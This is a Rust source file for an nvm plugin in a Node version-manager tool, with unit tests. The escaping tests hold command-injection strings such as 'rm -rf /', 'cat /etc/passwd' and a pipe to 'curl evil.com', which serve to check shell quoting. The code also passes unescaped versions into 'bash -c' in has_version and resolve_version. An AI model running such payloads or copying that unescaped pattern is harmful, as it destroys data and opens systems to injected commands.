use crate::plugins::VersionManagerPlugin;
use anyhow::{Context, Result};
use std::path::PathBuf;
use std::process::Command;
use std::sync::{Arc, Mutex};

/// Plugin for nvm (Node Version Manager)
///
/// nvm is a bash script that manages Node.js versions. It's sourced in the shell
/// and provides commands like `nvm use`, `nvm install`, etc.
#[derive(Debug)]
pub struct NvmPlugin {
    /// Cached availability check result
    availability_cache: Arc<Mutex<Option<bool>>>,
}

impl NvmPlugin {
    /// Creates a new NvmPlugin instance
    pub fn new() -> Self {
        Self {
            availability_cache: Arc::new(Mutex::new(None)),
        }
    }

    /// Returns the path to nvm.sh
    ///
    /// Checks in order:
    /// 1. $NVM_DIR/nvm.sh (if NVM_DIR is set)
    /// 2. ~/.nvm/nvm.sh (default location)
    fn nvm_sh_path(&self) -> Result<PathBuf> {
        // Try NVM_DIR environment variable first
        if let Ok(nvm_dir) = std::env::var("NVM_DIR") {
            let nvm_sh = PathBuf::from(nvm_dir).join("nvm.sh");
            if nvm_sh.exists() {
                return Ok(nvm_sh);
            }
        }

        // Fall back to default ~/.nvm/nvm.sh
        let home = dirs::home_dir().context("Could not determine home directory")?;
        let nvm_sh = home.join(".nvm").join("nvm.sh");

        if nvm_sh.exists() {
            Ok(nvm_sh)
        } else {
            anyhow::bail!("nvm.sh not found in $NVM_DIR or ~/.nvm")
        }
    }

    /// Runs an nvm command and returns the output
    ///
    /// This sources nvm.sh and then executes the given nvm command.
    fn run_nvm_command(&self, args: &[&str]) -> Result<String> {
        let nvm_sh = self.nvm_sh_path()?;

        // Build command: source nvm.sh && nvm <args>
        let mut cmd_parts = vec![
            "source",
            nvm_sh.to_str().context("Invalid UTF-8 in nvm.sh path")?,
            "&&",
            "nvm",
        ];
        cmd_parts.extend(args);

        let output = Command::new("bash")
            .arg("-c")
            .arg(cmd_parts.join(" "))
            .output()
            .context("Failed to execute nvm command")?;

        if output.status.success() {
            Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            anyhow::bail!("nvm command failed: {stderr}")
        }
    }

    /// Escapes a version string for safe use in shell commands
    fn escape_version(&self, version: &str) -> String {
        shell_escape::escape(version.into()).into_owned()
    }
}

impl Default for NvmPlugin {
    fn default() -> Self {
        Self::new()
    }
}

impl VersionManagerPlugin for NvmPlugin {
    fn name(&self) -> &str {
        "nvm"
    }

    fn version_files(&self) -> Vec<&str> {
        vec![".nvmrc"]
    }

    fn is_available(&self) -> Result<bool> {
        // Check cache first
        {
            let cache = self
                .availability_cache
                .lock()
                .map_err(|e| anyhow::anyhow!("Lock poisoned: {e}"))?;
            if let Some(cached) = *cache {
                return Ok(cached);
            }
        }

        // Check if nvm.sh exists
        let available = self.nvm_sh_path().is_ok();

        // Update cache
        {
            let mut cache = self
                .availability_cache
                .lock()
                .map_err(|e| anyhow::anyhow!("Lock poisoned: {e}"))?;
            *cache = Some(available);
        }

        Ok(available)
    }

    fn has_version(&self, version: &str) -> Result<bool> {
        // Use `nvm which <version>` to check if version is installed
        // This returns a path if installed, or an error if not
        match self.run_nvm_command(&["which", version]) {
            Ok(output) => Ok(!output.is_empty() && !output.contains("N/A")),
            Err(_) => Ok(false),
        }
    }

    fn current_version(&self) -> Result<Option<String>> {
        // Use `nvm current` to get the currently active version
        match self.run_nvm_command(&["current"]) {
            Ok(output) => {
                let trimmed = output.trim();
                if trimmed.is_empty() || trimmed == "none" || trimmed == "N/A" {
                    Ok(None)
                } else {
                    Ok(Some(trimmed.to_string()))
                }
            }
            Err(_) => Ok(None),
        }
    }

    fn activate_command(&self, version: &str) -> Result<String> {
        let escaped = self.escape_version(version);
        Ok(format!("nvm use {escaped}"))
    }

    fn install_command(&self, version: &str) -> Result<String> {
        let escaped = self.escape_version(version);
        Ok(format!("nvm install {escaped}"))
    }

    fn resolve_version(&self, version: &str) -> Result<String> {
        // Try to resolve aliases like "lts/hydrogen" or "node" using `nvm version`
        match self.run_nvm_command(&["version", version]) {
            Ok(resolved) => {
                // nvm version returns "v18.20.0" format, or "N/A" if not found
                if resolved.starts_with('v') {
                    Ok(resolved.trim_start_matches('v').to_string())
                } else if resolved == "N/A" {
                    // Return original version if cannot be resolved
                    Ok(version.to_string())
                } else {
                    Ok(resolved)
                }
            }
            Err(_) => {
                // If resolution fails, return version as-is
                Ok(version.to_string())
            }
        }
    }

    fn default_version(&self) -> Result<Option<String>> {
        // Get nvm's default version using `nvm version default`
        match self.run_nvm_command(&["version", "default"]) {
            Ok(version) => {
                // nvm returns "v18.20.0" format, or "N/A" if no default set
                if version == "N/A" || version.is_empty() {
                    Ok(None)
                } else if version.starts_with('v') {
                    Ok(Some(version.trim_start_matches('v').to_string()))
                } else {
                    Ok(Some(version))
                }
            }
            Err(_) => {
                // If command fails, assume no default is configured
                Ok(None)
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_name() {
        let plugin = NvmPlugin::new();
        assert_eq!(plugin.name(), "nvm");
    }

    #[test]
    fn test_version_files() {
        let plugin = NvmPlugin::new();
        assert_eq!(plugin.version_files(), vec![".nvmrc"]);
    }

    #[test]
    fn test_activate_command() {
        let plugin = NvmPlugin::new();
        assert_eq!(
            plugin.activate_command("18.20.0").unwrap(),
            "nvm use 18.20.0"
        );
    }

    #[test]
    fn test_install_command() {
        let plugin = NvmPlugin::new();
        assert_eq!(
            plugin.install_command("18.20.0").unwrap(),
            "nvm install 18.20.0"
        );
    }

    #[test]
    fn test_shell_escaping_activate() {
        let plugin = NvmPlugin::new();

        // Test various injection attempts
        let malicious_versions = vec![
            "18.20.0; rm -rf /",
            "18.20.0 && cat /etc/passwd",
            "18.20.0 | curl evil.com",
            "18.20.0$(whoami)",
            "18.20.0`whoami`",
        ];

        for version in malicious_versions {
            let cmd = plugin.activate_command(version).unwrap();
            // Verify that the version is properly quoted/escaped
            // shell-escape wraps the string in single quotes
            assert!(
                cmd.contains("'") || cmd.contains("\\"),
                "Command should escape/quote special characters: {cmd}"
            );
            // Verify the command starts with "nvm use"
            assert!(cmd.starts_with("nvm use "));
        }
    }

    #[test]
    fn test_shell_escaping_install() {
        let plugin = NvmPlugin::new();

        // Test various injection attempts
        let malicious_versions = vec![
            "18.20.0; rm -rf /",
            "18.20.0 && cat /etc/passwd",
            "18.20.0 | curl evil.com",
        ];

        for version in malicious_versions {
            let cmd = plugin.install_command(version).unwrap();
            // Verify that the version is properly quoted/escaped
            // shell-escape wraps the string in single quotes
            assert!(
                cmd.contains("'") || cmd.contains("\\"),
                "Command should escape/quote special characters: {cmd}"
            );
            // Verify the command starts with "nvm install"
            assert!(cmd.starts_with("nvm install "));
        }
    }

    #[test]
    fn test_availability_caching() {
        let plugin = NvmPlugin::new();

        // First call should populate cache
        let result1 = plugin.is_available();
        // Second call should use cache
        let result2 = plugin.is_available();

        // Both should return the same result
        assert_eq!(result1.is_ok(), result2.is_ok());
        if let (Ok(r1), Ok(r2)) = (result1, result2) {
            assert_eq!(r1, r2);
        }
    }
}
